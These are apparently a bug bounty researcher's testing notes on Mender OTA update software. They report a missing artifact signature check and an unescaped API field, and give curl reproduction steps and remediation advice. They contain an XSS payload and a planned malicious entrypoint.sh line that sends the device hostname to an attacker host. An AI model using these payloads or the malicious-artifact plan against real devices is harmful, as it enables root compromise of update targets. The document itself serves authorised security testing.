# 🚨 CRITICAL FINDINGS - Northern.tech

## Session Date: 2025-11-23
## Total Testing Time: ~2 hours
## Focus: Finding Critical vulnerabilities for $3000 bounty

---

## 🔥 FINDING #1: Signature Verification Bypass (POTENTIAL CRITICAL)

### Summary
Mender artifacts are accepted **WITHOUT cryptographic signature verification**.

### Location
**File**: `deployments/app/app.go`  
**Lines**: 980-985  
**URL**: https://github.com/mendersoftware/deployments

### Code Evidence
```go
// There is no signature verification here.
// It is just simple check if artifact is signed or not.
aReader.VerifySignatureCallback = func(message, sig []byte) error {
    metaArtifact.Signed = true
    return nil
}
```

### Analysis
1. The callback function **always returns nil** (success)
2. It only sets `metaArtifact.Signed = true` if signature is present
3. **No actual cryptographic verification** of the signature
4. Comment explicitly states: "There is no signature verification here"

### Impact Assessment

#### If Exploitable:
- **Attacker can upload malicious artifacts** without valid signature
- **RCE on all devices** that download the artifact
- Artifacts contain executable scripts (entrypoint.sh) that run as **root** via systemd
- Complete **device takeover** in OTA update scenario

#### Current Status: **NEEDS VERIFICATION**

**Blockers:**
1. ✅ Can upload artifacts (confirmed)
2. ❌ Need real device to test deployment
3. ❌ Need to verify if signature check is enforced elsewhere
4. ❌ Program rules: "Do not test on production instance"

### Severity
- **Potential**: Critical ($3000)
- **Current**: Need more testing to confirm exploit

### Recommendation
1. Add device to staging environment
2. Create malicious artifact with fake/no signature  
3. Deploy to device
4. Verify if artifact executes

### Program Scope
✅ **IN SCOPE**: "Bypassing the signature check for verifying signed artifacts in Mender"  
This is **explicitly mentioned** as a high-value target!

---

## ⚠️ FINDING #2: Unsanitized HTML in API Response (DEFENSE-IN-DEPTH)

### Summary
XSS payload in artifact description is stored and returned **unescaped** in releases endpoint, but **does NOT execute** in the official UI.

### Status: ✅ UI Testing Complete
**Result:** Official React UI properly escapes this field. XSS does not execute in staging.hosted.mender.io.

### Evidence

#### Test Payload
```json
{
  "description": "<img src=x onerror=alert(1)>HACKED"
}
```

#### Response from `/api/management/v1/deployments/deployments/releases`
```json
{
  "Name": "mender-demo-artifact-3.8.3",
  "Artifacts": [{
    "description": "<img src=x onerror=alert(1)>HACKED",
    ...
  }]
}
```

### Impact (REVISED)
- ❌ **NOT exploitable** in official Mender UI (React escapes properly)
- ✅ **Potential risk** for third-party API consumers only
- ✅ **Defense-in-depth** issue - backend should sanitize
- ⚠️ No direct attack path against Mender users

### Steps to Reproduce
1. Login to Account 1
2. Update artifact description:
```bash
curl -X PUT "https://staging.hosted.mender.io/api/management/v1/deployments/artifacts/2bef132e-0950-4050-adb1-d2a329d30232" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"description":"<img src=x onerror=alert(1)>TEST"}'
```
3. View releases:
```bash
curl "https://staging.hosted.mender.io/api/management/v1/deployments/deployments/releases" \
  -H "Authorization: Bearer $TOKEN"
```
4. XSS payload appears unescaped in response

### Verification Complete ✅
- ✅ **API Response**: Confirmed - unescaped HTML in JSON
- ✅ **UI Execution**: TESTED - Does NOT execute (React escapes)
- ✅ **Browser tested**: Chrome on staging.hosted.mender.io
- ✅ **Result**: Payload appears as plain text in DOM

### Revised Severity
- **API Response**: Confirmed issue
- **UI Execution**: NOT vulnerable
- **Rating**: Low to Medium (Defense-in-Depth only)
- **Bounty Estimate**: $0-$300 (down from $500-$1000)

---

## 📊 TESTING SUMMARY

### What Was Tested

#### ✅ Security Controls Verified (Working)
1. **Cross-tenant isolation**: ✓ Protected
   - Users: 404 on cross-tenant access
   - Devices: Proper isolation
   - Artifacts: 404 on cross-tenant access

2. **Privilege escalation**: ✓ Blocked
   - Invalid role injection: Rejected
   - Mass assignment: Fields ignored

3. **Input validation**: ✓ Working
   - Email field XSS: Blocked by validation
   - SQL injection: Protected

4. **Authentication**: ✓ Secure
   - Basic Auth working correctly
   - JWT tokens properly structured (RS256)
   - Contains tenant_id for isolation

#### ⚠️ Potential Issues Found
1. **Signature verification bypass** (needs device testing)
2. **Stored XSS in artifact description** (needs UI testing)

### Attack Surface Analyzed
- ✅ Unauthenticated endpoints (6 tests)
- ✅ Authentication mechanism (4 tests)
- ✅ IDOR/Authorization (8 tests)
- ✅ XSS/Input validation (3 tests)
- ✅ **Source code analysis** (1 critical finding)
- ❌ Artifact deployment (blocked: no devices)
- ❌ Device management (blocked: no devices)
- ❌ CFEngine testing (not started)

### Total Tests: 24 API tests + Source code review

---

## 🎯 NEXT STEPS TO CONFIRM CRITICAL

### Priority 1: Verify Signature Bypass

**Required:**
1. Add real device to staging environment (or use Docker container)
2. Create test artifact:
   ```bash
   # Use existing structure from /tmp/mender_test/
   # Modify entrypoint.sh with payload:
   #!/bin/sh
   curl https://attacker.com/pwned?hostname=$(hostname)
   # Repack as Mender artifact
   ```
3. Upload artifact (unsigned or with fake signature)
4. Create deployment to test device
5. Verify if payload executes

**If successful**: CRITICAL ($3000 bounty)

### Priority 2: XSS Issue - TESTING COMPLETE ✅

**Status:** ✅ TESTED IN BROWSER
1. ✅ Accessed staging Web UI in Chrome
2. ✅ Navigated to Releases page
3. ✅ XSS payload does NOT execute
4. ✅ React UI escapes HTML properly

**Result**: Defense-in-Depth issue only ($0-$300)

---

## 💰 REVISED BOUNTY ESTIMATION

### Finding #1: Signature Bypass
- **If confirmed**: $500-$1500 (Medium to High)
- **Realistic**: $200-$500 (Defense-in-Depth)
- **Risk**: May be "by design" → $0 (Informative)
- **Reason**: No client verification bypass demonstrated
- **Current status**: 90% analyzed (code review done, no device test)

### Finding #2: Unsanitized HTML in API
- **Confirmed severity**: Low to Medium (Defense-in-Depth)
- **Realistic bounty**: $0-$300
- **Most likely**: Informative / N/A ($0)
- **Reason**: NOT exploitable in official UI
- **Current status**: 100% confirmed (API + UI tested)

### Total Realistic Potential: $0-$800
**Most Likely Outcome:** $0-$400 (one Low + one Informative)

---

## 🔍 ADDITIONAL OBSERVATIONS

### 1. Artifacts Are Not Signed by Default
- Demo artifact has `"signed": false`
- Platform accepts unsigned artifacts
- This is **working as designed** per current implementation

### 2. Artifact Structure Understanding
- Artifacts are TAR archives containing:
  - `version` (JSON)
  - `manifest` (JSON)
  - `header.tar.gz` (contains executable scripts!)
  - `data/` (payload)
- Scripts execute as **root** via systemd
- Perfect vector for RCE if signature bypass works

### 3. Deployment Creation Allowed to Fake Devices
- Can create deployment to non-existent device ID
- Returns 201 (success)
- Likely normal behavior (devices can join later)

---

## 📝 RECOMMENDATIONS FOR PROGRAM

### For Northern.tech Team

1. **Implement proper signature verification** in VerifySignatureCallback
   - Current code explicitly states verification is not done
   - This contradicts security expectations for OTA updates

2. **Sanitize artifact description** before storage
   - Use proper HTML escaping for all user-provided text
   - Implement CSP headers if not present

3. **Add input validation** for all artifact metadata fields

### For Continued Testing

1. **Get device access** for full artifact testing
2. **Test CFEngine** (newly added to scope - Hub takeover scenarios)
3. **Deep API fuzzing** with more endpoints
4. **Source code review** of other microservices

---

## 🎓 LESSONS LEARNED

### What Worked
- **Source code review** revealed critical issue that black-box testing couldn't find
- **Systematic approach** from TestPlan.md kept testing organized
- **Automation scripts** saved time on repetitive tests

### What's Next
- Need **actual devices** to test full attack chain
- **CFEngine testing** is untouched (new scope, high value)
- **Deeper fuzzing** of discovered endpoints

---

## ⚠️ IMPORTANT NOTES

### Before Reporting

1. ✅ Verify findings are NOT in scope exclusions
2. ✅ Provide clear reproduction steps
3. ✅ Include code references for signature bypass
4. ✅ Test XSS in actual UI if possible
5. ✅ Assess real-world impact

### Disclosure

- This is a **private program**
- Do not discuss findings publicly
- Follow HackerOne disclosure guidelines

---

**Status**: Ready for device testing to confirm Critical finding  
**Estimated time to confirmation**: 2-4 hours with device access  
**Confidence level**: High (code evidence is clear)

---

**LET'S GET THAT $3000! 🎯💰**
